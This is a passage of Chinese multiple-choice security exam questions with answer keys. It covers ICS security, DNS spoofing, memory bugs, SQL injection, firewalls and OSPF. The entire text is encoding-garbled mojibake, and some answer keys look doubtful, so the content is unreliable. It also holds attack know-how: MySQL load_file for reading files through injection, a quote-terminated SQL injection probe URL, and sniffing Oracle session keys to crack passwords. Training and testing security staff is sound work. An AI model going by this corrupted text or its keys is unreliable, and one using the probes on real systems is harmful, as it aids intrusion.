åœ¨å·¥ä¸šæ§åˆ¶ç³»ç»Ÿç³»ç»Ÿæ¶æ„ä¸­ï¼Œç®¡ç†ç½‘ç»œä¸æ§åˆ¶ç½‘ç»œä¹‹é—´çš„å¼±åˆ†ç¦»ï¼›</p><p>C åœ¨å·¥ä¸šæ§åˆ¶ç³»ç»Ÿç³»ç»Ÿæ¶æ„ä¸­ï¼Œå¯¹ç½‘ç»œè´Ÿè½½å‡è¡¡å’Œå†—ä½™çš„è¾ƒå°‘å…³æ³¨ï¼›</p><p>D åœ¨å·¥ä¸šæ§åˆ¶ç³»ç»Ÿç³»ç»Ÿæ¶æ„ä¸­ï¼Œç»å¸¸ä½¿ç”¨å®‰å…¨è®¾å¤‡çš„ç¼ºçœé…ç½®ï¼›</p><p>é€šé…ç¬¦æ©ç ï¼ˆCï¼‰ç­‰ä»·äºå…³é”®å­—â€œanyâ€ã€‚</p><p>A 1.1.1.1</p><p>B 255.1.1.1</p><p>C 255.255.255.255</p><p>D 0.0.0.0</p><p>DNSç”±äºå…¶åœ¨Internetä¸Šçš„æˆ˜ç•¥è§’è‰²ï¼Œå®¹æ˜“æˆä¸ºé»‘å®¢æ”»å‡»çš„ç›®æ ‡ã€‚ä¸‹é¢å“ªç§æ”»å‡»ä½¿ç”¨é€’å½’æŸ¥è¯¢æ¥æ¯’åŒ–DNSæœåŠ¡å™¨çš„ç¼“å­˜ï¼Ÿï¼ˆAï¼‰</p><p>A DNSæ¬ºéª—</p><p>B ç¤¾ä¼šå·¥ç¨‹</p><p>C æ“çºµä¸»æœºæ–‡ä»¶</p><p>D åŸŸåè¯‰è®¼</p><p>ç¤ºä¾‹ä»£ç å±•ç¤ºäº†å“ªä¸€ç§æ¼æ´ï¼Ÿ char<em>ptr=(char</em>)malloc(SIZE); â€¦ if(abrt){ free(ptr); } â€¦ free(ptr);ï¼ˆBï¼‰</p><p>A ç©ºæŒ‡é’ˆå¼•ç”¨</p><p>B åŒé‡é‡Šæ”¾</p><p>C é‡Šæ”¾åä½¿ç”¨</p><p>D å†…å­˜æ³„éœ²</p><p>é’ˆå¯¹Mysqlçš„SQLæ³¨å…¥ï¼Œå¯ä»¥ä½¿ç”¨ä»€ä¹ˆå‡½æ•°æ¥è®¿é—®ç³»ç»Ÿæ–‡ä»¶ï¼Ÿï¼ˆBï¼‰</p><p>A load file infile</p><p>B load_file</p><p>C load file</p><p>D load file_infile</p><p>åœ¨ä¸‹å›¾ç»™å‡ºçš„åŠ å¯†è¿‡ç¨‹ä¸­mi,i=1,2,â€¦,nè¡¨ç¤ºæ˜æ–‡åˆ†ç»„ï¼Œci,i=1,2,â€¦,nè¡¨ç¤ºå¯†æ–‡åˆ†ç»„ï¼Œivè¡¨ç¤ºåˆå§‹åºåˆ—ï¼Œkè¡¨ç¤ºå¯†é’¥ï¼Œeè¡¨ç¤ºåˆ†ç»„åŠ å¯†ã€‚è¯¥åˆ†ç»„åŠ å¯†è¿‡ç¨‹çš„å·¥ä½œæ¨¡å¼æ˜¯ï¼ˆ A ï¼‰ã€‚</p><p>A pcbc</p><p>B ctr</p><p>C cfb</p><p>D ecb</p><p>ä¸‹é¢å“ªä¸ªä¸æ˜¯æ§åˆ¶ç³»ç»Ÿçš„åŸºæœ¬è¦ç´ ï¼Ÿï¼ˆBï¼‰</p><p>A è°ƒèŠ‚å™¨</p><p>B è¢«æ§å¯¹è±¡</p><p>C æ§åˆ¶å™¨</p><p>D ä¼ æ„Ÿå™¨</p><p>åœ¨ UNIX æ“ä½œç³»ç»Ÿä¸­ï¼ŒæŠŠè¾“å…¥ï¼è¾“å‡ºè®¾å¤‡çœ‹ä½œæ˜¯ï¼Ÿï¼ˆBï¼‰</p><p>A ç›®å½•æ–‡ä»¶</p><p>B ç‰¹æ®Šæ–‡ä»¶</p><p>C ç´¢å¼•æ–‡ä»¶</p><p>D æ™®é€šæ–‡ä»¶</p><p>åº”ç”¨ç½‘å…³é˜²ç«å¢™çš„é€»è¾‘ä½ç½®å¤„åœ¨ OSIä¸­çš„å“ªä¸€å±‚ï¼Ÿï¼ˆCï¼‰</p><p>A ç‰©ç†å±‚</p><p>B é“¾è·¯å±‚</p><p>C åº”ç”¨å±‚</p><p>D ä¼ è¾“å±‚</p><p>SG-I6000ç³»ç»Ÿä¸­å®‰å…¨ç®¡ç†æ¨¡å—ï¼Œå®‰å…¨ç›‘æµ‹çš„æŒ‡æ ‡ä¸åŒ…æ‹¬ï¼ˆ C ï¼‰ã€‚</p><p>A ä¿å¯†æ£€æµ‹ç³»ç»Ÿå®‰è£…ç‡</p><p>B æ•æ„Ÿä¿¡æ¯æ£€æŸ¥æ‰§è¡Œç‡</p><p>C æ—¥å¾…åŠæ¥æ”¶æ€»æ•°</p><p>D æ„ŸæŸ“ç—…æ¯’å®¢æˆ·ç«¯æ•°</p><p>ä¸‹åˆ—ä¸å±äºç›‘æµ‹å·¥ä¸šæ§åˆ¶ç³»ç»Ÿä¿¡æ¯å®‰å…¨åŸŸçš„é€”å¾„æ˜¯ï¼šï¼ˆCï¼‰</p><p>A æ¨æµ‹å‹ç›‘è§†</p><p>B ç›´æ¥ç›‘è§†</p><p>C é—´æ¥ç›‘è§†</p><p>D æ—¥å¿—é‡‡é›†</p><p>ipsecå±äºï¼ˆ C ï¼‰çš„å®‰å…¨è§£å†³æ–¹æ¡ˆã€‚</p><p>A ä¼ è¾“å±‚</p><p>B åº”ç”¨å±‚</p><p>C ç½‘ç»œå±‚</p><p>D ç‰©ç†å±‚</p><p>ä½œä¸ºä¸€åä¿¡æ¯å®‰å…¨ä¸“ä¸šäººå‘˜ï¼Œä½ æ­£åœ¨ä¸ºæŸå…¬å¸è®¾è®¡ä¿¡æ¯èµ„æºçš„è®¿é—®æ§åˆ¶ç­–ç•¥ã€‚ç”±äºè¯¥å…¬å¸çš„äººå‘˜æµåŠ¨æ€§è¾ƒå¤§ï¼Œä½ å‡†å¤‡æ ¹æ®ç”¨æˆ·æ‰€å±çš„ç»„ä»¥åŠåœ¨å…¬å¸ä¸­çš„èŒè´£æ¥ç¡®å®šå¯¹ä¿¡æ¯èµ„æºçš„è®¿é—®æƒé™ï¼Œæœ€åº”è¯¥é‡‡ç”¨ä¸‹åˆ—å“ªä¸€ç§è®¿é—®æ§åˆ¶æ¨¡å‹ï¼Ÿï¼ˆCï¼‰</p><p>A æœ€å°ç‰¹æƒï¼ˆLeast Privilegeï¼‰</p><p>B å¼ºåˆ¶è®¿é—®æ§åˆ¶ï¼ˆMACï¼‰</p><p>C åŸºäºè§’è‰²è®¿é—®æ§åˆ¶ï¼ˆRBACï¼‰</p><p>D è‡ªä¸»è®¿é—®æ§åˆ¶ï¼ˆDACï¼‰</p><p>å¦‚ä¸‹ä»£ç ä¼šå¯¼è‡´ä»€ä¹ˆæ ·çš„å®‰å…¨é—®é¢˜ï¼Ÿ char*stored_password=â€â€; readPassword(stored_password); if(safe_strcmp(stored_password,user_password)) //Accessprotectedresources }    ï¼ˆAï¼‰</p><p>A ç™»å½•ç»•è¿‡ï¼Œæ”»å‡»è€…åªè¦æä¾›ä¸€ä¸ªç©ºå­—ç¬¦ä¸²çš„user_passwordï¼Œå°±å¯ä»¥ç»•è¿‡è¯¥éªŒè¯</p><p>B ä¿¡æ¯æ³„å¯†ï¼Œå› ä¸ºstored_passwordæ²¡æœ‰åŠ å¯†</p><p>C ç¼“å†²åŒºæº¢å‡ºï¼Œå­—ç¬¦ä¸²user_passwordæ²¡æœ‰é•¿åº¦æ ¡éªŒ</p><p>D readPasswordå­˜åœ¨æ¼æ´ï¼Œæ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œè¿‡æ»¤</p><p>è •è™«ã€æœ¨é©¬ã€é»‘å®¢æ”»å‡»ä¼šåˆ©ç”¨å·¥ä¸šæ§åˆ¶ç³»ç»Ÿçš„è„†å¼±æ€§å¯¹ç³»ç»Ÿå‘åŠ¨æ”»å‡»ï¼Œä¸‹åˆ—å“ªç§å·¥ä¸šæ§åˆ¶ç³»ç»Ÿè„†å¼±æ€§ä¸å¯è¢«åˆ©ç”¨å‘åŠ¨åŒ…é‡æ”¾æ”»å‡»ï¼šï¼ˆBï¼‰</p><p>A å·¥ä¸šæ§åˆ¶ç³»ç»Ÿçš„é€šä¿¡åè®®çš„è„†å¼±æ€§ï¼›</p><p>B å·¥ä¸šæ§åˆ¶ç³»ç»Ÿè¿ç»´ç®¡ç†çš„è„†å¼±æ€§ï¼›</p><p>C å·¥ä¸šæ§åˆ¶ç³»ç»Ÿç½‘ç»œçš„è„†å¼±æ€§ï¼›</p><p>D å·¥ä¸šæ§åˆ¶ç³»ç»Ÿåº”ç”¨è½¯ä»¶è„†å¼±æ€§çš„è„†å¼±æ€§ï¼›</p><p>VTP ä¿®å‰ªçš„ä½œç”¨ä¸åŒ…æ‹¬ï¼ˆDï¼‰ã€‚</p><p>A å‡å°‘ä¸å¿…è¦çš„ç»„æ’­ä¿¡æ¯</p><p>B å‡å°‘ä¸å¿…è¦çš„å¹¿æ’­ä¿¡æ¯</p><p>C èŠ‚çº¦é“¾è·¯å¸¦å®½</p><p>D å‡å°‘VLANæ•°é‡</p><p>åŒ…è¿‡æ»¤æŠ€æœ¯é˜²ç«å¢™åœ¨è¿‡æ»¤æ•°æ®åŒ…æ—¶ï¼Œä¸€èˆ¬ä¸å…³å¿ƒï¼ˆ C ï¼‰ã€‚</p><p>A æ•°æ®åŒ…çš„åè®®ç±»å‹</p><p>B æ•°æ®åŒ…çš„ç›®çš„åœ°å€</p><p>C æ•°æ®åŒ…çš„å†…å®¹</p><p>D æ•°æ®åŒ…çš„æºåœ°å€</p><p>é‡‡ç”¨ debug ip ospf packet å‘½ä»¤å¯ä»¥æ˜¾ç¤ºæ”¶åˆ°çš„ ospf åŒ…çš„ä¿¡æ¯ï¼Œå…¶ä¸­ ospf è®¤è¯ç±»å‹ å­—æ®µä¸åŒ…æ‹¬ä»¥ä¸‹çš„ï¼ˆAï¼‰ã€‚</p><p>A 3-ip è®¤è¯</p><p>B 0-ä¸è®¤è¯</p><p>C 2-MD5 è®¤è¯</p><p>D 1-æ˜æ–‡è®¤è¯</p><p>ä¸‹é¢å“ªä¸ªé€‰é¡¹å±äºç›®å‰SACDAç³»ç»Ÿç½‘ç»œçš„ç°çŠ¶ï¼šï¼ˆAï¼‰</p><p>A ç½‘ç»œè¾¹ç•Œä¸å¤Ÿæ¸…æ™°</p><p>B åŸæœ‰IPæ•°æ®ç½‘ä¿¡æ¯å®‰å…¨æŠ€æœ¯èƒ½æ»¡è¶³è¦æ±‚</p><p>C ç½‘ç»œä¹‹é—´éƒ½ä¸èƒ½äº’ç›¸è®¿é—®</p><p>D ç³»ç»Ÿæ¼æ´ä¸å¤š</p><p>syslog æœºåˆ¶ä¸»è¦ä¾æ®ä¸¤ä¸ªé‡è¦çš„æ–‡ä»¶:syslogd å’Œï¼ˆDï¼‰ã€‚</p><p>A log</p><p>B sys.conf</p><p>C conf</p><p>D syslog.conf</p><p>ICMP åè®®å·¥ä½œåœ¨ï¼ˆCï¼‰ã€‚</p><p>A ä¼ è¾“å±‚</p><p>B åº”ç”¨å±‚</p><p>C ç½‘é™…å±‚</p><p>D æ§åˆ¶å±‚</p><p>ç”¨ show cdp neighbors detail å‘½ä»¤ï¼Œä¸èƒ½çœ‹åˆ°ä»¥ä¸‹å“ªç§ä¿¡æ¯ï¼ˆBï¼‰ã€‚</p><p>A å¯¹ç«¯è®¾å¤‡ IOS ç‰ˆæœ¬</p><p>B æœ¬è®¾å¤‡ IP åœ°å€</p><p>C å¯¹ç«¯è®¾å¤‡ IP åœ°å€</p><p>D å¯¹ç«¯è®¾å¤‡ ID</p><p>åœ¨ P2DR2 å®‰å…¨æ¨¡å‹ä¸­ï¼Œâ€œDtâ€ä»£è¡¨ï¼ˆDï¼‰ã€‚</p><p>A ç³»ç»Ÿåšå‡ºå“åº”æ‰€éœ€æ—¶é—´</p><p>B æ”»å‡»æˆåŠŸæ‰€éœ€æ—¶é—´</p><p>C å®‰å…¨ä½“ç³»å»ºè®¾æ‰€éœ€æ—¶é—´</p><p>D ç³»ç»Ÿæ£€æµ‹åˆ°æ”»å‡»è¡Œä¸ºæ‰€éœ€æ—¶é—´</p><p>ä¸‹è¿°å“ªä¸ªè¿¹è±¡å‘ç”Ÿæ—¶ï¼Œå·¥ä¸šæ§åˆ¶ç³»ç»Ÿä¸ç”¨å‘æœ‰å…³äººå‘˜æˆ–è§’è‰²å‘å‡ºè­¦æŠ¥ï¼šï¼ˆAï¼‰</p><p>A é¢„æœŸä¹‹å†…çš„ç”¨æˆ·å‘èµ·äº†èµ„æºæˆ–æœåŠ¡è¯·æ±‚</p><p>B æ—¥å¿—è®°å½•åœ¨æ— æ³•è§£é‡Šçš„æƒ…å†µä¸‹è¢«åˆ é™¤æˆ–ä¿®æ”¹</p><p>C å®¡è®¡åŠŸèƒ½è¢«ç¦æ­¢æˆ–ä¿®æ”¹</p><p>D å½“å‘ç”Ÿå¼‚å¸¸èµ„æºæ¶ˆè€—</p><p>å¦‚ä¸‹ä»£ç çš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼ˆCï¼‰disable_functions=phpinfo,eval,passthru,exec,system</p><p>A é™å®šç³»ç»Ÿå¯è®¿é—®ç›®å½•èŒƒå›´</p><p>B è¿‡æ»¤æ•æ„Ÿå­—ç¬¦ï¼Œé¢„é˜²SQLæ³¨å…¥æ”»å‡»</p><p>C é™åˆ¶è¿™äº›å‡½æ•°çš„è¿è¡Œï¼Œé™ä½å‘½ä»¤æ‰§è¡Œæ”»å‡»çš„é£é™©</p><p>D é™åˆ¶æ–‡ä»¶æ“ä½œï¼Œä¿æŠ¤ç³»ç»Ÿå…³é”®é…ç½®æ–‡ä»¶</p><p>tomcatåå°æ•°æ®åŒ…ä¸­è®¤è¯çš„å­—æ®µæ˜¯ï¼ˆAï¼‰</p><p>A Authorizationï¼šBasic XXX</p><p>B user-Agent</p><p>C auth-oa</p><p>D authorï¼šBasic XXX</p><p>åŸºäºå…¬å¼€å¯†é’¥çš„æ•°å­—ç­¾åç®—æ³•å¯¹æ¶ˆæ¯è¿›è¡Œç­¾åå’ŒéªŒè¯æ—¶ï¼Œæ­£ç¡®çš„ç­¾åå’ŒéªŒè¯æ–¹å¼æ˜¯ï¼ˆAï¼‰ã€‚</p><p>A å‘é€æ–¹ç”¨è‡ªå·±çš„ç§æœ‰å¯†é’¥ç­¾åï¼Œæ¥æ”¶æ–¹ç”¨å‘é€æ–¹çš„å…¬å¼€å¯†é’¥éªŒè¯</p><p>B å‘é€æ–¹ç”¨æ¥æ”¶æ–¹çš„å…¬å¼€å¯†é’¥ç­¾åï¼Œæ¥æ”¶æ–¹ç”¨è‡ªå·±çš„ç§æœ‰å¯†é’¥éªŒè¯</p><p>C å‘é€æ–¹ç”¨è‡ªå·±çš„å…¬å¼€å¯†é’¥ç­¾åï¼Œæ¥æ”¶æ–¹ç”¨å‘é€æ–¹çš„å…¬å¼€å¯†é’¥éªŒè¯</p><p>D å‘é€æ–¹ç”¨è‡ªå·±çš„ç§æœ‰å¯†é’¥ç­¾åï¼Œæ¥æ”¶æ–¹ç”¨è‡ªå·±çš„ç§æœ‰å¯†é’¥éªŒè¯</p><p>é‡‡ç”¨ TFTP å‘½ä»¤å¯¹äº¤æ¢æœºé…ç½®è¿›è¡Œå®‰å…¨å¤‡ä»½æ—¶ï¼Œéœ€è¦ï¼ˆBï¼‰ã€é…ç½®æ–‡ä»¶åç­‰å‚æ•°ã€‚</p><p>A æº IP åœ°å€</p><p>B TFTP æœåŠ¡å™¨ IP åœ°å€</p><p>C æº MAC åœ°å€</p><p>D ç‰©ç†åœ°å€</p><h2 id="å¤šé€‰é¢˜"><a href="#å¤šé€‰é¢˜" class="headerlink" title="å¤šé€‰é¢˜"></a><strong>å¤šé€‰é¢˜</strong></h2><p>é˜²ç«å¢™ truståŸŸä¸­çš„å®¢æˆ·æœºé€šè¿‡ natè®¿é—® untrustä¸­çš„æœåŠ¡å™¨çš„ ftpæœåŠ¡ï¼Œå·²ç»å…è®¸å®¢æˆ·æœºè®¿é—®æœåŠ¡å™¨çš„ tcp21ç«¯å£ï¼Œä½†åªèƒ½ç™»é™†åˆ°æœåŠ¡å™¨ï¼Œå´æ— æ³•ä¸‹è½½æ–‡ä»¶ï¼Œä»¥ä¸‹è§£å†³åŠæ³•ä¸­å¯èƒ½çš„æ˜¯ï¼šï¼ˆ CDA ï¼‰</p><p>A åœ¨ trust untruståŸŸé—´é…ç½®ä¸­å¯ç”¨ detect ftp</p><p>B FTPå·¥ä½œæ–¹å¼ä¸º passiveæ¨¡å¼æ—¶ï¼Œä¿®æ”¹ untrust truståŸŸé—´ inæ–¹å‘çš„é»˜è®¤è®¿é—®ç­–ç•¥ä¸ºå…è®¸</p><p>C ä¿®æ”¹ trust untruståŸŸé—´åŒå‘çš„é»˜è®¤è®¿é—®ç­–ç•¥ä¸ºå…è®¸</p><p>D FTPå·¥ä½œæ–¹å¼ä¸º portæ¨¡å¼æ—¶ï¼Œä¿®æ”¹ untrust truståŸŸé—´ inæ–¹å‘çš„é»˜è®¤è®¿é—®ç­–ç•¥ä¸ºå…è®¸</p><p>ä¸ºäº†é˜²æ­¢SQLæ³¨å…¥ï¼Œä¸‹åˆ—ç‰¹æ®Šå­—ç¬¦ï¼ˆBDACï¼‰éœ€è¦è¿›è¡Œè½¬ä¹‰ã€‚</p><p>A ï¼›ï¼ˆåˆ†å·ï¼‰</p><p>B â€˜ï¼ˆå•å¼•å·ï¼‰</p><p>C â€ï¼ˆåŒå¼•å·ï¼‰</p><p>D %ï¼ˆç™¾åˆ†å·ï¼‰</p><p>æ”»å‡»è€…æäº¤è¯·æ±‚<a href="http://www.xxxyzz.com/displaynews.asp?id=772%E2%80%99%EF%BC%8C%E7%BD%91%E7%AB%99%E5%8F%8D%E9%A6%88%E4%BF%A1%E6%81%AF">http://www.xxxyzz.com/displaynews.asp?id=772â€™ï¼Œç½‘ç«™åé¦ˆä¿¡æ¯</a> ä¸º Microsoft OLE DB Provider for ODBC Driversé”™è¯¯ â€˜80040e14â€™ï¼Œèƒ½å¤Ÿè¯´æ˜è¯¥ç½‘ ç«™ï¼ˆABDCï¼‰</p><p>A æ•°æ®åº“ä¸ºAccess</p><p>B ç½‘ç«™æœåŠ¡ç¨‹åºæ²¡æœ‰å¯¹ idè¿›è¡Œè¿‡æ»¤</p><p>C è¯¥ç½‘ç«™å¯èƒ½å­˜åœ¨ SQLæ³¨å…¥æ¼æ´</p><p>D æ•°æ®åº“è¡¨ä¸­æœ‰ä¸ªå­—æ®µåä¸ºid</p><p>ä½ ä½œä¸ºå•ä½ç½‘ç«™è¿ç»´äººå‘˜ï¼Œè¿‘æœŸå‘ç°ç½‘ç«™é¡µé¢ç»å¸¸è¢«æ¤å…¥å¹¿å‘Šï¼Œæ­¤æ—¶ä½ åº”é‡‡å–ï¼ˆ CA ï¼‰æŠ€æœ¯æªæ–½ã€‚</p><p>A æ£€æŸ¥Webåº”ç”¨ç¨‹åºæ˜¯å¦å­˜åœ¨SQLæ³¨å…¥æ¼æ´</p><p>B å°†é˜²ç«å¢™æ›´æ¢ä¸ºæ›´é«˜æ€§èƒ½çš„è®¾å¤‡</p><p>C åˆ†æWebæœåŠ¡å™¨æ—¥å¿—</p><p>D æ£€æŸ¥Webåº”ç”¨ç¨‹åºæ˜¯å¦å­˜åœ¨è·¨ç«™è„šæœ¬æ¼æ´</p><p>å·²çŸ¥æŸå•ä½çš„ç½‘ç«™æä¾›ç½‘ä¸Šå®¡æ‰¹ä¸šåŠ¡ï¼Œåˆ™è¯¥ç½‘ç«™æœåŠ¡å™¨æ½œåœ¨çš„å®‰å…¨å¨èƒæ˜¯ï¼ˆ BDA ï¼‰ã€‚</p><p>A ç¤¾ä¼šå·¥ç¨‹æ”»å‡»</p><p>B å£ä»¤æš´åŠ›çŒœè§£</p><p>C TelnetæœåŠ¡ä¼šè¯çŒœæµ‹</p><p>D HTTPæ˜æ–‡çªƒå¬</p><p>ä¸ºäº†é€šè¿‡HTTPé”™è¯¯ä»£ç æ¥æ˜¾ç¤ºä¸åŒé”™è¯¯é¡µé¢ï¼Œåˆ™éœ€è¦ä¿®æ”¹WebLogicçš„web.xmlä¸­ï¼ˆDCBï¼‰å…ƒç´ ã€‚</p><p>A error-type</p><p>B location</p><p>C error-code</p><p>D error-page</p><p>å¦‚æœæœåŠ¡å™¨ä¸Šçš„æ‰€æœ‰htmlé¡µé¢éƒ½å·²ç»è¢«æŒ‚é©¬ï¼Œä»¥ä¸‹å“ªäº›æ–¹æ³•å¯ä»¥å¿«é€Ÿæ¸…é™¤æ¶æ„ä»£ç ï¼Ÿï¼ˆBCDï¼‰</p><p>A é‡æ–°ç¼–å†™htmlé¡µé¢</p><p>B ä½¿ç”¨ä¸“é—¨è½¯ä»¶æ¸…é™¤htmlé¡µé¢ä¸­çš„ä»£ç </p><p>C ä½¿ç”¨å¤‡ä»½è¿˜åŸhtmlé¡µé¢</p><p>D åˆ é™¤æ‰€æœ‰è¢«ä¿®æ”¹è¿‡å¾—htmlé¡µé¢</p><p>ç”¨ THCç»„ç»‡çš„ Oracleçš„å·¥å…·ï¼Œé€šè¿‡ snifferæ–¹å¼æŠ“å–æ•°æ®åº“çš„è®¤è¯ä¿¡æ¯å¯æœ‰æ•ˆç ´è§£ Oracleå¯†ç ï¼Œä»¥ä¸‹å“ªäº›æ•°æ®æ˜¯å¿…é¡»è·å–çš„ï¼Ÿï¼ˆCABï¼‰</p><p>A AUTH_PASSWORD</p><p>B ç”¨æˆ·å</p><p>C AUTH_SESSKEY</p><p>D å®ä¾‹å</p><p>ç”Ÿäº§æœåŠ¡å™¨é€šå¸¸éƒ½æ˜¯ UNIXå¹³å°ï¼Œèµ„äº§ä»·å€¼æœ€é«˜ï¼Œä¸ç›´æ¥è¿æ¥å¤–éƒ¨ç½‘ç»œï¼Œä¸»è¦çš„å®‰å…¨éœ€æ±‚æ˜¯?ï¼ˆBACï¼‰</p><p>A è´¦å·å£ä»¤</p><p>B è®¿é—®æ§åˆ¶</p><p>C æƒé™ç®¡ç†å’Œè¡¥ä¸ç®¡ç†</p><p>D æ•°æ®è¿‡æ»¤</p><p>ä½ æ˜¯å•ä½ç½‘ç»œä¿¡æ¯å®‰å…¨ç»´æŠ¤æŠ€æœ¯äººå‘˜ï¼Œç½‘ç»œä¸€ç›´è¿è¡Œè‰¯å¥½ã€‚è¿‘æœŸï¼Œä¸çŸ¥ä»€ä¹ˆåŸå› ï¼Œç»å¸¸æœ‰ç”¨æˆ·æŠ¥å‘Šç½‘ç»œå˜æ…¢ï¼Œæœ‰æ—¶ç½‘é¡µåˆšåˆšæ‰“å¼€ä¸€åŠä¾¿çªç„¶å‡ºé”™æˆ–ä¸å†è¿”å›å‰©ä½™å†…å®¹ã€‚ä»¥ä¸‹æªæ–½å¯ç”¨äºè¿›ä¸€æ­¥è¿½æŸ¥åŸå› çš„æ˜¯ï¼ˆ CBA ï¼‰ã€‚</p><p>A æ£€æŸ¥å®¡è®¡è®¾å¤‡è®°å½•</p><p>B æ£€æŸ¥æ˜¯å¦æœ‰ARPåœ°å€æ¬ºéª—</p><p>C ä½¿ç”¨å—…æ¢å™¨æŸ¥çœ‹ç½‘ç»œæ•°æ®åŒ…</p><p>D æ£€æŸ¥é˜²ç«å¢™ACLåˆ—è¡¨</p><p>åœ¨WebLogicä¸­ï¼ŒWebåº”ç”¨çš„æ ¹ç›®å½•ä¸€èˆ¬ç”±ï¼ˆCAï¼‰æ–‡ä»¶çš„context-rootå…ƒç´ å®šä¹‰ã€‚</p><p>A weblogic.xml</p><p>B webapp.xml</p><p>C application.xml</p><p>D Web-application.xml</p><p>ä»¥ä¸‹å…³äºSYNFloodå’ŒSYNCookieæŠ€æœ¯çš„å“ªäº›è¯´æ³•æ˜¯ä¸æ­£ç¡®çš„?( AD )</p><p>A SYNFloodæ”»å‡»ä¸»è¦æ˜¯é€šè¿‡å‘é€è¶…å¤§æµé‡çš„æ•°æ®åŒ…æ¥å µå¡ç½‘ç»œå¸¦å®½</p><p>B SYNCookieæŠ€æœ¯åœ¨è¶…å¤§æµé‡æ”»å‡»çš„æƒ…å†µä¸‹å¯èƒ½ä¼šå¯¼è‡´ç½‘å…³è®¾å¤‡ç”±äºè¿›è¡Œå¤§é‡çš„è®¡ç®—è€Œå¤±æ•ˆ</p><p>C SYNCookieæŠ€æœ¯çš„åŸç†æ˜¯é€šè¿‡SYNCookieç½‘å…³è®¾å¤‡æ‹†åˆ†TCPä¸‰æ¬¡æ¡æ‰‹è¿‡ç¨‹ï¼Œè®¡ç®—æ¯ä¸ªTCPè¿æ¥çš„Cookieå€¼ï¼Œå¯¹è¯¥è¿æ¥è¿›è¡ŒéªŒè¯</p><p>D ä»¥ä¸Šéƒ½æ­£ç¡®</p><p>åœ¨OSPFåè®®ä¸­ï¼Œå¯¹äºDRçš„æè¿°ï¼Œä¸‹åˆ—æ­£ç¡®çš„æœ‰å“ªäº›ï¼Ÿ( CDA )</p><p>A DRå’ŒBDRä¹‹é—´ä¹Ÿè¦å»ºç«‹é‚»æ¥å…³ç³»</p><p>B è‹¥ä¸¤å°è·¯ç”±å™¨çš„ä¼˜å…ˆçº§å€¼ä¸åŒï¼Œåˆ™é€‰æ‹©ä¼˜å…ˆçº§å€¼è¾ƒå°çš„è·¯ç”±å™¨ä½œä¸ºDR</p><p>C æœ¬å¹¿æ’­ç½‘ç»œä¸­æ‰€æœ‰çš„è·¯ç”±å™¨éƒ½å°†å…±åŒä¸DRé€‰ä¸¾</p><p>D è‹¥ä¸¤å°è·¯ç”±å™¨çš„ä¼˜å…ˆçº§å€¼ç›¸ç­‰ï¼Œåˆ™é€‰æ‹©Router IDå¤§çš„è·¯ç”±å™¨ä½œä¸ºDR</p><p>APPæºç å®‰å…¨æ¼æ´ä¸»è¦æœ‰ï¼ˆDCABï¼‰ã€‚</p><p>A soä¿æŠ¤æ¼æ´</p><p>B è°ƒè¯•è®¾ç½®æ¼æ´</p><p>C Dexä¿æŠ¤æ¼æ´</p><p>D ä»£ç æ··æ·†æ¼æ´</p><p>ç”¨å“ªäº›æŠ€æœ¯æªæ–½å¯ä»¥æœ‰æ•ˆåœ°é˜²å¾¡é€šè¿‡ä¼ªé€ ä¿ç•™IPåœ°å€è€Œå®æ–½çš„æ”»å‡»ï¼ˆBDCï¼‰</p><p>A æ•°æ®åŠ å¯†</p><p>B è¾¹ç•Œè·¯ç”±å™¨ä¸Šè®¾ç½®ACLs</p><p>C é˜²ç«å¢™ç­–ç•¥è®¾ç½®</p><p>D å…¥ä¾µæ£€æµ‹ç³»ç»Ÿ</p><p>å¦‚æœæ•°æ®åº“ä¸éœ€è¦è¿œç¨‹è®¿é—®ï¼Œå¯ä»¥ç¦æ­¢è¿œç¨‹ tcp/ipè¿æ¥ï¼Œä»¥å¢å¼ºå®‰å…¨æ€§ã€‚å¯é€‰æ‹©çš„æœ‰æ•ˆæ–¹æ³•ï¼š( DB )</p><p>A åœ¨/etc/my.cnfä¸‹æ·»åŠ  remoteConnnect=disable</p><p>B åœ¨ mysqldæœåŠ¡å™¨ä¸­å‚æ•°ä¸­æ·»åŠ  â€“skip-networkingå¯åŠ¨å‚æ•°æ¥ä½¿ mysql</p><p>C ç¦æ­¢ tcp/ipåè®®çš„ä½¿ç”¨</p><p>D ç”¨é˜²ç«å¢™å°å µæ•°æ®åº“ä¾¦å¬ç«¯å£é¿å…è¿œç¨‹è¿æ¥</p><p>å½“ä½¿ç”¨é‚®ä»¶ç¨‹åºå¦‚OUTLOOKã€FOXMAILæ”¶å‘é‚®ä»¶æ—¶ï¼Œæœ€æœ‰å¯èƒ½å—åˆ°çš„æ”»å‡»æ˜¯ï¼ˆ AD ï¼‰ã€‚</p><p>A ç½‘ç»œçªƒå¬</p><p>B SQLæ³¨å…¥</p><p>C ç½‘ç»œé’“é±¼</p><p>D æœ¨é©¬æ”»å‡»</p><p>ä¸‹åˆ—å¯¹äºPAPåè®®æè¿°æ­£ç¡®çš„æ˜¯ï¼Ÿï¼ˆ BD ï¼‰</p><p>A ä½¿ç”¨ä¸‰æ­¥æ¡æ‰‹æ–¹å¼å®ŒæˆéªŒè¯</p><p>B ä½¿ç”¨ä¸¤æ­¥æ¡æ‰‹æ–¹å¼å®ŒæˆéªŒè¯</p><p>C ä½¿ç”¨åŠ å¯†å¯†ç è¿›è¡ŒéªŒè¯</p><p>D ä½¿ç”¨æ˜æ–‡å¯†ç è¿›è¡ŒéªŒè¯</p><p>æœ‰ä¸¤ä¸ªè´¦å·001å’Œ002ï¼›ç»æ£€æŸ¥å‘ç°002è´¦å·åè¢«æ·»åŠ åˆ°/etc/cron.d/cron.denyæ–‡ä»¶ä¸­ï¼Œé‚£ä¹ˆä¸‹é¢è¯´æ³•æ­£ç¡®çš„æ˜¯ï¼ˆCBAï¼‰</p><p>A åˆ é™¤/etc/cron.d/cron.denyæ–‡ä»¶åï¼Œ001å’Œ002ç”¨æˆ·éƒ½ä¸å¯ä»¥åˆ›å»ºã€ç¼–è¾‘ã€æ˜¾ç¤ºå’Œåˆ é™¤crontabæ–‡ä»¶</p><p>B 002ç”¨æˆ·å¯ä»¥åˆ›å»ºã€ç¼–è¾‘ã€æ˜¾ç¤ºå’Œåˆ é™¤crontabæ–‡ä»¶</p><p>C 001ç”¨æˆ·å¯ä»¥åˆ›å»ºã€ç¼–è¾‘ã€æ˜¾ç¤ºå’Œåˆ é™¤crontabæ–‡ä»¶</p><p>D åˆ 